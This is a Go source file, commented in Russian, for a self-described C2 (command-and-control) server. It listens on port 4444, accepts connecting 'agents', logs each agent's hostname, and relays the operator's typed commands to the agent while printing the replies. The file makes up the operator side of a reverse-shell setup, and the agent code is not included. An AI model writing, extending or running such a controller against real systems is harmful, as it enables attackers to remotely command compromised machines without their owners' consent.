package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func main() {
	// Запускаем TCP-слушатель на всех интерфейсах, порт 4444
	listener, err := net.Listen("tcp", "0.0.0.0:4444")
	if err != nil {
		fmt.Println("Ошибка запуска сервера:", err)
		return
	}
	defer listener.Close()
	fmt.Println("[C2] Сервер запущен на порту 4444. Ожидание агентов...")

	// Бесконечный цикл: принимаем агентов и обслуживаем их по очереди
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Ошибка принятия соединения:", err)
			continue
		}
		fmt.Println("[+] Агент подключился")

		// Читаем приветствие (hostname)
		reader := bufio.NewReader(conn)
		firstLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Ошибка чтения приветствия:", err)
			conn.Close()
			continue
		}
		fmt.Printf("[+] Агент: %s\n", strings.TrimSpace(firstLine))

		// Сразу переходим в интерактивный режим
		interactiveMode(conn)

		fmt.Println("[+] Сессия с агентом завершена. Ожидание следующего агента...")
	}
}

// interactiveMode ретранслирует данные между сетевым соединением и терминалом
func interactiveMode(conn net.Conn) {
	// Отключаем таймаут на время интерактива
	conn.SetReadDeadline(time.Time{})

	// Канал для сигнала завершения горутин
	done := make(chan bool)

	// Горутина 1: сокет -> stdout (вывод на экран)
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				// Пишем в stdout (терминал)
				if _, writeErr := os.Stdout.Write(buf[:n]); writeErr != nil {
					done <- true
					return
				}
			}
			if err != nil {
				// Если соединение закрыто или ошибка – выходим
				done <- true
				return
			}
		}
	}()

	// Горутина 2: stdin -> сокет (ввод с клавиатуры)
	go func() {
		// Сканер для чтения с клавиатуры
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			line := scanner.Text()
			// Если пользователь ввел exit, отправляем его в сокет и выходим
			if line == "exit" {
				conn.Write([]byte("exit\n"))
				done <- true
				return
			}
			// Отправляем команду в сокет (с \n)
			if _, err := conn.Write([]byte(line + "\n")); err != nil {
				done <- true
				return
			}
		}
		// Если сканер завершился (например, Ctrl+D)
		done <- true
	}()

	// Ждём завершения любой из горутин
	<-done
	fmt.Println("\n[+] Выход из интерактивного режима")

	// Восстанавливаем таймаут (необязательно)
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}
